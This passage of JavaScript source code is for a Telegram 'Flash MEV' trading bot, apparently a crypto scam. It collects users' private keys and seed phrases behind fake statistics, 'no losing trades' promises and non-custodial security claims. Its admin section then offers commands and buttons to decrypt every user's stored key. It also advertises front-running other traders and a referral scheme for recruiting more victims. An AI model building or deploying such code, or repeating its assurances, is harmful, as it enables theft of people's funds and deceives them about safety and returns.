• Minimum Profit: ${getOptionLabel('mev', 'min_profit', profile.settings.min_profit)}
• Protection: ${getOptionLabel('mev', 'protection', profile.settings.protection)}
• Capital Allocation: ${profile.capital_percent}%

_You'll receive notifications for every executed opportunity._
`;
    }

    await ctx.replyWithMarkdown(deploymentText, Markup.inlineKeyboard([
        [Markup.button.callback('📊 View Live Stats', 'stats')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('wallet_menu', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo || !walletInfo.address) {
        await ctx.reply('⚠️ No wallet connected. Use /start');
        return;
    }

    const shortAddr = `${walletInfo.address.slice(0, 6)}...${walletInfo.address.slice(-4)}`;

    // Fetch real balances
    let balances = [];
    try {
        balances = await fetchMultiChainBalances(walletInfo.address);
    } catch (e) {
        console.error('Balance fetch error:', e.message);
    }

    let balanceDisplay = '_No balances found._';
    if (balances && balances.length > 0) {
        balanceDisplay = balances.map(b => `• *${b.chain}:* ${b.amount} ${b.symbol}`).join('\n');
    }

    await ctx.replyWithMarkdown(`
💰 *Your Wallet*

📍 *Address:* \`${shortAddr}\`
🔑 *Type:* ${walletInfo.type === 'seed_phrase' ? 'Seed Phrase' : 'Private Key'}
📅 *Imported:* ${new Date(walletInfo.importedAt).toLocaleDateString()}

*▸ Balances*
${balanceDisplay}

_Tap refresh to update balances._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_balances')],
        [Markup.button.callback('📤 Deposit', 'deposit')],
        [Markup.button.callback('📥 Withdraw', 'withdraw')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('stats', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.replyWithMarkdown(`
📊 *MEV Statistics*

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR PERFORMANCE*
• Trades Executed: 0
• Success Rate: --
• Total MEV: $0.00
• Best Trade: --

*▸ PROTOCOL STATS*
• Active Users: ${config.STATS.activeUsers.toLocaleString()}
• 24h Volume: ${config.STATS.volume24h}
• Avg Land Rate: ${config.STATS.landRate}
• Avg Latency: ${config.STATS.avgLatency}

━━━━━━━━━━━━━━━━━━━━━

_Stats update in real-time as your agent executes._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_stats')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('history', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.replyWithMarkdown(`
📜 *Trade History*

_No trades executed yet._

Your MEV agent will populate this list as it captures opportunities.

Each entry will show:
• Token pair traded
• Profit captured
• Transaction hash
• Timestamp
`, Markup.inlineKeyboard([
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('settings', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const profile = await userTracker.getTradingProfile(ctx.from.id);

    if (!profile) {
        await showMarketSelection(ctx);
        return;
    }

    const fields = getFields(profile.market);

    const settingsLines = fields.map(field => {
        const value = profile.settings?.[field.key];
        const label = value ? getOptionLabel(profile.market, field.key, value) : 'Not set';
        return `• *${field.label}:* ${label}`;
    }).join('\n');

    await ctx.replyWithMarkdown(`
⚙️ *${getMarketLabel(profile.market)} Agent Settings*

*▸ CAPITAL*
• Allocation: ${profile.capital_percent}%
• Minimum capital: $${config.MIN_TRADE_CAPITAL_USD}

*▸ MARKET SETTINGS*
${settingsLines}

*▸ RISK CONTROLS*
• Stop-loss engine: Enabled
• Take-profit engine: Enabled
• Exposure limiter: Active
• Notification alerts: On

━━━━━━━━━━━━━━━━━━━━━

_Allocate more capital to allow larger position sizing, but review risk settings carefully._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔁 Change Market', 'change_market')],
        [Markup.button.callback('✏️ Change Capital %', 'setup_change_capital')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('referral', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const botUsername = ctx.botInfo.username;
    const referralLink = `https://t.me/${botUsername}?start=ref_${ctx.from.id}`;

    await ctx.replyWithMarkdown(`
🎁 *Referral Program*

Earn *30% of MEV profits* from every trader you refer, forever.

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR REFERRAL LINK*
${referralLink}

*▸ YOUR STATS*
• Referrals: 0
• Earnings: $0.00
• Tier: Bronze

*▸ TIERS*
🥉 Bronze: 30% (0-9 referrals)
🥈 Silver: 35% (10-49 referrals)
🥇 Gold: 40% (50+ referrals)

━━━━━━━━━━━━━━━━━━━━━

_Tap below to share your link._
`, Markup.inlineKeyboard([
        [Markup.button.url('📤 Share Link', `https://t.me/share/url?url=${encodeURIComponent(referralLink)}&text=${encodeURIComponent('Deploy your MEV agent and capture flash-arb profits 24/7')}`)],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 HELP BUTTON CALLBACK (from dashboard)
// ═══════════════════════════════════════════════════
bot.action('help', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.replyWithMarkdown(`
❓ *Help & Support*

*▸ QUICK START*
1. Use /start to begin
2. Import your wallet key or seed phrase
3. Deploy your MEV agent
4. Watch profits accumulate

*▸ COMMANDS*
/start - Main menu
/docs - Full documentation
/wallet - View wallet
/stats - View statistics
/history - Trade history
/settings - Configure agent
/help - This help message

*▸ SUPPORT*
[💬 Community](${config.CHANNEL_URL})
[🌐 Website](${config.WEBSITE})

*▸ FAQ*
• Is it safe? Yes, keys are encrypted locally
• What chains? ETH, Base, BSC, Arb, Solana
• Min capital? $${config.MIN_TRADE_CAPITAL_USD}
• Fees? 10% of net trading profits only
`, Markup.inlineKeyboard([
        [Markup.button.callback('📚 Documentation', 'docs_menu')],
        [Markup.button.url('💬 Join Community', config.CHANNEL_URL)],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('disconnect', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.replyWithMarkdown(`
⚠️ *Disconnect Wallet?*

This will:
• Remove your wallet from the bot
• Stop your MEV agent
• Delete all encrypted keys

Your funds remain safe in your wallet.

_Are you sure?_
`, Markup.inlineKeyboard([
        [Markup.button.callback('✅ Yes, Disconnect', 'confirm_disconnect')],
        [Markup.button.callback('❌ Cancel', 'dashboard')]
    ]));
});

bot.action('confirm_disconnect', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await walletManager.removeWallet(ctx.from.id);

    await ctx.editMessageText(
        '✅ Wallet disconnected successfully.\n\nUse /start to reconnect.',
        Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Start Over', 'back_to_start')]
        ])
    );
});

bot.action('dashboard', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo || !walletInfo.address) {
        await ctx.replyWithMarkdown('⚠️ No wallet connected. Use /start');
        return;
    }

    const profile = await userTracker.getTradingProfile(ctx.from.id);

    if (!profile) {
        await showMarketSelection(ctx);
        return;
    }

    const shortAddr = `${walletInfo.address.slice(0, 6)}...${walletInfo.address.slice(-4)}`;

    await ctx.editMessageText(`
✅ *Dashboard*

📍 \`${shortAddr}\`

📊 *Market:* ${getMarketLabel(profile.market)}  
💰 *Capital Allocation:* ${profile.capital_percent}%

Your ${getMarketLabel(profile.market)} agent is ready.
`, { parse_mode: 'Markdown', ...getDashboardKeyboard() });
});

// Misc callbacks
bot.action('refresh_balances', async (ctx) => {
    await safeAnswerCbQuery(ctx, '🔄 Refreshing balances...');
    await ctx.reply('✅ Balances refreshed.');
});

bot.action('refresh_stats', async (ctx) => {
    await safeAnswerCbQuery(ctx, '🔄 Refreshing stats...');
    await ctx.reply('✅ Stats refreshed.');
});

bot.action('deposit', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo || !walletInfo.address) {
        await ctx.reply('⚠️ No wallet connected. Use /start');
        return;
    }

    await ctx.replyWithMarkdown(`
📤 *Deposit Funds*

Send tokens to your wallet address:

\`${walletInfo.address}\`

*Supported chains:*
• Ethereum (ETH, USDC, USDT)
• Base (ETH, USDC)
• BSC (BNB, USDT)
• Arbitrum (ETH, USDC)

_Deposits are detected automatically within 30 seconds._
`, Markup.inlineKeyboard([
        [Markup.button.callback('◀️ Back', 'wallet_menu')]
    ]));
});

bot.action('withdraw', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.replyWithMarkdown(`
📥 *Withdraw Funds*

Send /withdraw <amount> <token> <address>

Example:
\`/withdraw 100 USDC 0x...\`

_Available tokens: ETH, USDC, USDT_
`, Markup.inlineKeyboard([
        [Markup.button.callback('◀️ Back', 'wallet_menu')]
    ]));
});


// ═══════════════════════════════════════════════════
// 🔍 TEMPORARY: Get file_id for uploaded videos/images
// ═══════════════════════════════════════════════════
bot.on('video', (ctx) => {
    const fileId = ctx.message.video.file_id;
    console.log('\n═══════════════════════════════════════');
    console.log('📹 VIDEO FILE ID (copy this):');
    console.log(fileId);
    console.log('═══════════════════════════════════════\n');

    ctx.reply(`✅ Video received!\n\nFile ID:\n\`${fileId}\`\n\nCopy this to your .env file`, {
        parse_mode: 'Markdown'
    });
});

bot.on('animation', (ctx) => {
    const fileId = ctx.message.animation.file_id;
    console.log('\n═══════════════════════════════════════');
    console.log('🎬 GIF FILE ID (copy this):');
    console.log(fileId);
    console.log('═══════════════════════════════════════\n');

    ctx.reply(`✅ GIF received!\n\nFile ID:\n\`${fileId}\`\n\nCopy this to your .env file`, {
        parse_mode: 'Markdown'
    });
});

bot.on('photo', (ctx) => {
    const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
    console.log('\n═══════════════════════════════════════');
    console.log('🖼️ PHOTO FILE ID (copy this):');
    console.log(fileId);
    console.log('═══════════════════════════════════════\n');

    ctx.reply(`✅ Photo received!\n\nFile ID:\n\`${fileId}\`\n\nCopy this to your .env file as ACTIVATE_IMAGE_ID`, {
        parse_mode: 'Markdown'
    });
});

// ═══════════════════════════════════════════════════
// 🎯 /wallet COMMAND
// ═══════════════════════════════════════════════════
bot.command('wallet', async (ctx) => {
    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo || !walletInfo.address) {
        return ctx.replyWithMarkdown(
            '⚠️ *No wallet connected.*\n\nUse /start to connect your wallet first.',
            Markup.inlineKeyboard([[Markup.button.callback('🚀 Get Started', 'back_to_start')]])
        );
    }

    const shortAddr = `${walletInfo.address.slice(0, 6)}...${walletInfo.address.slice(-4)}`;

    // Fetch real balances
    let balances = [];
    try {
        balances = await fetchMultiChainBalances(walletInfo.address);
    } catch (e) {
        console.error('Balance fetch error:', e.message);
    }

    let balanceDisplay = '_No balances found._';
    if (balances && balances.length > 0) {
        balanceDisplay = balances.map(b => `• *${b.chain}:* ${b.amount} ${b.symbol}`).join('\n');
    }

    await ctx.replyWithMarkdown(`
💰 *Your Wallet*

━━━━━━━━━━━━━━━━━━━━━

📍 *Address:*
\`${shortAddr}\`

🔑 *Type:* ${walletInfo.type === 'seed_phrase' ? 'Seed Phrase' : 'Private Key'}
📅 *Imported:* ${new Date(walletInfo.importedAt).toLocaleDateString()}

━━━━━━━━━━━━━━━━━━━━━

*▸ Balances*
${balanceDisplay}

_Tap refresh to update balances._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_balances')],
        [Markup.button.callback('📤 Deposit', 'deposit')],
        [Markup.button.callback('📥 Withdraw', 'withdraw')],
        [Markup.button.callback('🔌 Disconnect', 'disconnect')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /portfolio COMMAND
// ═══════════════════════════════════════════════════
bot.command('portfolio', async (ctx) => {
    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo || !walletInfo.address) {
        return ctx.replyWithMarkdown(
            '⚠️ *No wallet connected.*\n\nUse /start to connect your wallet first.',
            Markup.inlineKeyboard([[Markup.button.callback('🚀 Get Started', 'back_to_start')]])
        );
    }

    await ctx.replyWithMarkdown(`
📊 *Portfolio & PnL*

━━━━━━━━━━━━━━━━━━━━━

*▸ CURRENT POSITIONS*
_No active positions yet._

━━━━━━━━━━━━━━━━━━━━━

*▸ PERFORMANCE*
• Total Trades: 0
• Win Rate: —
• Total PnL: $0.00
• Best Trade: —
• Worst Trade: —

━━━━━━━━━━━━━━━━━━━━━

*▸ ACTIVE STRATEGIES*
▸ Cross-DEX Arbitrage: Inactive
▸ Liquidation Sniping: Inactive
▸ Front-Run Detection: Inactive
▸ Back-Run Capture: Inactive

━━━━━━━━━━━━━━━━━━━━━

_Deploy your agent to start building positions._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Deploy Agent', 'deploy_agent')],
        [Markup.button.callback('📜 View History', 'history')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /settings COMMAND
// ═══════════════════════════════════════════════════
bot.command('settings', async (ctx) => {
    const profile = await userTracker.getTradingProfile(ctx.from.id);

    if (!profile) {
        await showMarketSelection(ctx);
        return;
    }

    const fields = getFields(profile.market);
    const settings = profile.settings || {};

    const settingsLines = fields.map(field => {
        const value = settings[field.key];
        const label = getOptionLabel(profile.market, field.key, value);
        return `• *${field.label}:* ${label}`;
    }).join('\n');

    await ctx.replyWithMarkdown(`
⚙️ *${getMarketLabel(profile.market)} Agent Settings*

━━━━━━━━━━━━━━━━━━━━━

*▸ CAPITAL*
• Allocation: ${profile.capital_percent}%
• Minimum capital: $${config.MIN_TRADE_CAPITAL_USD}

*▸ MARKET SETTINGS*
${settingsLines}

*▸ RISK CONTROLS*
• Stop-loss engine: Enabled
• Take-profit engine: Enabled
• Exposure limiter: Active
• Notification alerts: On

━━━━━━━━━━━━━━━━━━━━━

_Allocate more capital to allow larger position sizing, but review risk settings carefully._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔁 Change Market', 'change_market')],
        [Markup.button.callback('✏️ Change Capital %', 'setup_change_capital')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /referral COMMAND
// ═══════════════════════════════════════════════════
bot.command('referral', async (ctx) => {
    const botUsername = ctx.botInfo.username;
    const referralLink = `https://t.me/${botUsername}?start=ref_${ctx.from.id}`;

    await ctx.replyWithMarkdown(`
🎁 *Referral Program*

Earn *30% of MEV profits* from every trader you refer, forever.

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR REFERRAL LINK*
${referralLink}

*▸ YOUR STATS*
• Referrals: 0
• Earnings: $0.00
• Tier: 🥉 Bronze

*▸ TIERS*
🥉 Bronze: 30% (0-9 referrals)
🥈 Silver: 35% (10-49 referrals)
🥇 Gold: 40% (50+ referrals)

━━━━━━━━━━━━━━━━━━━━━

_Tap below to share your link._
`, Markup.inlineKeyboard([
        [Markup.button.url('📤 Share Link', `https://t.me/share/url?url=${encodeURIComponent(referralLink)}&text=${encodeURIComponent('Deploy your MEV agent and capture flash-arb profits 24/7')}`)]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /info COMMAND
// ═══════════════════════════════════════════════════
bot.command('info', async (ctx) => {
    await ctx.replyWithMarkdown(`
ℹ️ *How Flash Markets Works*

Flash Markets is a multi-market automated trading system.

*▸ SUPPORTED MARKETS*

💱 *Forex*
Currency pairs, gold, indices, leverage control, session filtering, risk-per-trade settings.

🪙 *Crypto*
Spot, futures, grid, DCA, pair selection, timeframe control, TP/SL logic.

📈 *Stocks*
US, UK, EU, Asia markets, growth/dividend/ETF/momentum strategies, sector selection, holding period rules.

⚡ *MEV*
On-chain arbitrage, liquidations, private relay execution, slippage tolerance, chain selection, minimum profit targets.

━━━━━━━━━━━━━━━━━━━━━

*▸ SETUP FLOW*

1️⃣ Select market  
2️⃣ Allocate capital percentage  
3️⃣ Configure market-specific settings  
4️⃣ Connect or import wallet  
5️⃣ Deploy agent

━━━━━━━━━━━━━━━━━━━━━

*▸ CAPITAL RULES*

Minimum usable trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*

More allocated capital can allow larger position sizing and bigger opportunity capture, but risk management still matters.

━━━━━━━━━━━━━━━━━━━━━

Use /docs for the full guide.
`, Markup.inlineKeyboard([
        [Markup.button.callback('📚 Read Full Docs', 'docs_menu')],
        [Markup.button.callback('🚀 Select Market', 'deploy_flash_mev')]
    ]));
});


// ═══════════════════════════════════════════════════
// 📚 /docs COMMAND - Main Documentation Menu
// ═══════════════════════════════════════════════════
bot.command('docs', async (ctx) => {
    await ctx.replyWithMarkdown(`
📚 *Flash Markets Documentation*

_Complete guide to Forex, Crypto, Stock, and MEV automated trading._

━━━━━━━━━━━━━━━━━━━━━

*▸ TOPICS*

Select a topic below to learn more:
`, Markup.inlineKeyboard([
        [Markup.button.callback('📊 Market Overview', 'docs_what_is_mev')],
        [Markup.button.callback('🚀 Getting Started', 'docs_getting_started')],
        [Markup.button.callback('🌐 Supported Markets', 'docs_chains')],
        [Markup.button.callback('🎯 Strategies', 'docs_strategies')],
        [Markup.button.callback('🔐 Security', 'docs_security')],
        [Markup.button.callback('🤖 Commands', 'docs_commands')],
        [Markup.button.callback('💰 Fees', 'docs_fees')],
        [Markup.button.callback('❓ FAQ', 'docs_faq')],
        [Markup.button.callback('⚠️ Risk Disclosure', 'docs_risk')],
        [Markup.button.callback('🚀 Launch Bot', 'back_to_start')]
    ]));
});

// ═══════════════════════════════════════════════════
// 📚 DOCS CALLBACKS
// ═══════════════════════════════════════════════════

bot.action('docs_what_is_mev', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
⚡ *What is MEV?*

*Maximal Extractable Value (MEV)* is profit captured by strategically reordering, inserting, or censoring transactions within blockchain blocks.

While retail traders often lose to MEV (via sandwich attacks), Flash MEV lets you become the searcher — capturing that value for yourself.

━━━━━━━━━━━━━━━━━━━━━

*▸ HOW IT WORKS*

*1. Monitor* — Scan mempool across 5 EVM chains + Solana 24/7

*2. Simulate* — Test every opportunity in a sandbox

*3. Bundle* — Package profitable trades via private relays

*4. Execute* — Bundles only land if profitable, otherwise revert

━━━━━━━━━━━━━━━━━━━━━

*Result:* You capture MEV that would otherwise go to professional searchers.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Getting Started', 'docs_getting_started')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_getting_started', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
🚀 *Getting Started*

Setup takes less than 60 seconds:

*1.* Open @Flash\\_Mev\\_trading\\_bot

*2.* Send /start to initialize

*3.* Tap *Import Key* and paste your private key OR 12/24-word seed phrase

*4.* Fund your wallet with at least *$200* on any supported chain

*5.* Tap *Deploy Agent* to start scanning

━━━━━━━━━━━━━━━━━━━━━

🔒 *Security Note:*
Your keys are encrypted with AES-256-GCM. You can export them anytime.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🌐 Supported Chains', 'docs_chains')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_chains', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
🌐 *Supported Chains*

━━━━━━━━━━━━━━━━━━━━━

*▸ EVM CHAINS (Flashbots relay)*

• *Ethereum* — ETH, USDC, USDT, WBTC, DAI
• *Base* — ETH, USDC, USDT
• *Arbitrum* — ETH, USDC, USDT
• *Polygon* — MATIC, USDC, USDT
• *BNB Chain* — BNB, USDC, USDT

━━━━━━━━━━━━━━━━━━━━━

*▸ SOLANA (Jito relay)*

• SOL, USDC, USDT, BONK, WIF

━━━━━━━━━━━━━━━━━━━━━

All chains monitored simultaneously. One EVM key covers all EVM chains.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🎯 Strategies', 'docs_strategies')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_strategies', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
🎯 *Trading Strategies*

Flash MEV employs 4 core strategies:

━━━━━━━━━━━━━━━━━━━━━

🔄 *Cross-DEX Arbitrage*
Buy cheap on one DEX, sell higher on another — same block. Zero market exposure.

━━━━━━━━━━━━━━━━━━━━━

⚡ *Front-Running*
Detect large pending trades and position ahead of them. Profit when the whale moves the price.

━━━━━━━━━━━━━━━━━━━━━

🎯 *Back-Running*
Execute immediately after a large trade. Capture momentum from market-moving transactions.

━━━━━━━━━━━━━━━━━━━━━

💥 *Liquidation Sniping*
Monitor lending protocols for undercollateralized positions. Trigger liquidations before competitors.

━━━━━━━━━━━━━━━━━━━━━

All strategies executed atomically — win or revert.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔐 Security', 'docs_security')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_security', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
🔐 *Security & Key Protection*

━━━━━━━━━━━━━━━━━━━━━

*▸ ENCRYPTION AT REST*

Private keys encrypted with *AES-256-GCM* — military-grade encryption used by banks. Even if servers compromised, attackers see only gibberish.

━━━━━━━━━━━━━━━━━━━━━

*▸ NON-CUSTODIAL DESIGN*

Export your key anytime via /wallet command. Import into MetaMask, Trust Wallet, or any wallet. You always have full control.

━━━━━━━━━━━━━━━━━━━━━

*▸ PRIVATE RELAY EXECUTION*

All trades route through Flashbots (EVM) and Jito (Solana) private relays. Transactions never touch public mempool — protected from sandwich attacks.

━━━━━━━━━━━━━━━━━━━━━

⚠️ *Never share your key with anyone — including us.*
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🤖 Commands', 'docs_commands')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_commands', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
🤖 *Bot Commands*

━━━━━━━━━━━━━━━━━━━━━

/start — Initialize bot and main menu

/wallet — View wallet, balances, manage funds

/portfolio — Active positions and P&L

/settings — Configure slippage, chains, notifications

/referral — Get referral link and track earnings

/info — How Flash Markets works

/help — All available commands

/stop — Pause automated notifications

━━━━━━━━━━━━━━━━━━━━━

Use /start for full dashboard with inline buttons.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('💰 Fees', 'docs_fees')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_fees', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
💰 *Fee Structure*

━━━━━━━━━━━━━━━━━━━━━

🎁 *NEW USER OFFER*

*0% fees for first 48 hours* after deployment.

Keep 100% of every profitable bundle during onboarding window.

━━━━━━━━━━━━━━━━━━━━━

*▸ STANDARD FEES*

After 48-hour window: *10% of net profits* on successful trades only.

You never pay fees on losing trades (because there are no losing trades — bundles revert if unprofitable).

━━━━━━━━━━━━━━━━━━━━━

*Example:*
Bundle captures $100 profit → You keep $90, we take $10
Bundle reverts → You pay $0
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('❓ FAQ', 'docs_faq')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_faq', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
❓ *Frequently Asked Questions*

━━━━━━━━━━━━━━━━━━━━━

*Q: Safe to import private key?*
A: Yes. Encrypted with AES-256-GCM. Export anytime.

*Q: Can I lose money on trades?*
A: No. Every bundle simulated first. Reverts if unprofitable. Zero gas on reverted bundles.

*Q: Minimum deposit?*
A: $200 recommended. Higher capital = larger opportunities.

*Q: Need VPS or technical setup?*
A: No. Runs on our cloud infrastructure. Just use Telegram.

*Q: How fast is execution?*
A: 51ms average latency, 91.2% landing rate. Direct validator connections.

*Q: Which tokens?*
A: Any ERC-20/SPL token with liquidity. Auto-filters honeypots and blacklisted tokens.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('⚠️ Risk Disclosure', 'docs_risk')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_risk', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
⚠️ *Risk Disclosure*

━━━━━━━━━━━━━━━━━━━━━

*IMPORTANT NOTICE:*

• MEV trading involves inherent risks including smart contract vulnerabilities and network congestion

• Past performance does not guarantee future results

• Only deploy capital you can afford to have temporarily illiquid

• Cryptocurrency trading is not suitable for all investors

• Flash MEV is a tool — not financial advice

━━━━━━━━━━━━━━━━━━━━━

_By using Flash MEV, you acknowledge and accept these risks._
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Launch Bot', 'back_to_start')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_menu', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    await ctx.editMessageText(`
📚 *Flash Markets Documentation*

_Complete guide to Forex, Crypto, Stock, and MEV automated trading._

━━━━━━━━━━━━━━━━━━━━━

*▸ TOPICS*

Select a topic below to learn more:
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('📊 Market Overview', 'docs_what_is_mev')],
            [Markup.button.callback('🚀 Getting Started', 'docs_getting_started')],
            [Markup.button.callback('🌐 Supported Markets', 'docs_chains')],
            [Markup.button.callback('🎯 Strategies', 'docs_strategies')],
            [Markup.button.callback('🔐 Security', 'docs_security')],
            [Markup.button.callback('🤖 Commands', 'docs_commands')],
            [Markup.button.callback('💰 Fees', 'docs_fees')],
            [Markup.button.callback('❓ FAQ', 'docs_faq')],
            [Markup.button.callback('⚠️ Risk Disclosure', 'docs_risk')],
            [Markup.button.callback('🚀 Launch Bot', 'back_to_start')]
        ])
    });
});

// ═══════════════════════════════════════════════════
// 🎯 /help COMMAND
// ═══════════════════════════════════════════════════
bot.command('help', async (ctx) => {
    try {
        console.log(`[COMMAND] /help triggered by ${ctx.from.id}`);
        await ctx.replyWithMarkdown(`
❓ *Help & Commands*

━━━━━━━━━━━━━━━━━━━━━

*▸ WALLET*
/wallet — Manage your wallet
/start — Restart / reconnect

*▸ TRADING*
/portfolio — View positions & PnL
/settings — Configure agent

*▸ EARNINGS*
/referral — Rewards program

*▸ LEARN*
/info — How FLASH MEV works
/docs — Full documentation guide

━━━━━━━━━━━━━━━━━━━━━

*▸ SUPPORT*
[💬 Community](${config.CHANNEL_URL})
[🌐 Website](${config.WEBSITE})
`, Markup.inlineKeyboard([
            [Markup.button.callback('📚 Documentation', 'docs_menu')],
            [Markup.button.url('💬 Community', config.CHANNEL_URL)]
        ]));
    } catch (err) {
        console.error('❌ /help command error:', err);
        await ctx.reply('❌ An error occurred. Please try again.');
    }
});



// ═══════════════════════════════════════════════════
// 🎯 /stop COMMAND (for users to disable random messages)
// ═══════════════════════════════════════════════════
bot.command('stop', async (ctx) => {
    const userId = ctx.from.id;

    if (randomSchedulers.has(userId)) {
        clearTimeout(randomSchedulers.get(userId));
        randomSchedulers.delete(userId);
    }

    // 💾 Mark user as inactive in database
    await userTracker.deactivateUser(userId);

    await ctx.replyWithMarkdown(`
🛑 *Notifications Paused*

You will no longer receive automated messages.

To restart, simply send /start again.

_Note: Your agent will continue running in the background if deployed._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Restart', 'back_to_start')]
    ]));
});



// ═══════════════════════════════════════════════════
// 👑 ADMIN COMMANDS
// ═══════════════════════════════════════════════════

// Middleware: Check admin access
const requireAdmin = async (ctx, next) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.reply('🚫 Access denied. Admin only.');
        await walletManager.logAdminAction(ctx.from.id, 'UNAUTHORIZED_ACCESS_ATTEMPT');
        return;
    }
    return next();
};

bot.command('admin_stats', requireAdmin, async (ctx) => {
    const stats = await walletManager.getGlobalStats();

    await ctx.replyWithMarkdown(`
👑 *ADMIN DASHBOARD*

━━━━━━━━━━━━━━━━━━━━━

*▸ GLOBAL STATS*
• Total Wallets: ${stats.totalWallets}
• Trades (24h): ${stats.tradesLast24h}
• Successful (24h): ${stats.successfulTrades24h}
• Total Profit (24h): $${stats.totalProfit24h.toFixed(2)}

━━━━━━━━━━━━━━━━━━━━━

*▸ COMMANDS*
/admin\\_users — List all users
/admin\\_decrypt <telegram\\_id> — Decrypt a key
/admin\\_user <telegram\\_id> — User stats
/admin\\_search <address> — Find by address
`, Markup.inlineKeyboard([
        [Markup.button.callback('👥 List Users (First 10)', 'admin_list_users')]
    ]));
});

bot.command('admin_users', requireAdmin, async (ctx) => {
    const { wallets, total } = await walletManager.getAllWallets(10, 0);

    if (wallets.length === 0) {
        return ctx.reply('No wallets found.');
    }

    let message = `👥 *All Users* (${total} total)\n\n`;

    wallets.forEach((w, i) => {
        message += `*${i + 1}.* @${w.username || 'unknown'}\n`;
        message += `   ID: \`${w.telegram_id}\`\n`;
        message += `   Wallet: \`${w.address.slice(0, 10)}...${w.address.slice(-6)}\`\n`;
        message += `   Type: ${w.key_type}\n\n`;
    });

    const buttons = wallets.map(w => [
        Markup.button.callback(
            `🔑 @${w.username || w.telegram_id}`,
            `admin_decrypt_${w.telegram_id}`
        )
    ]);

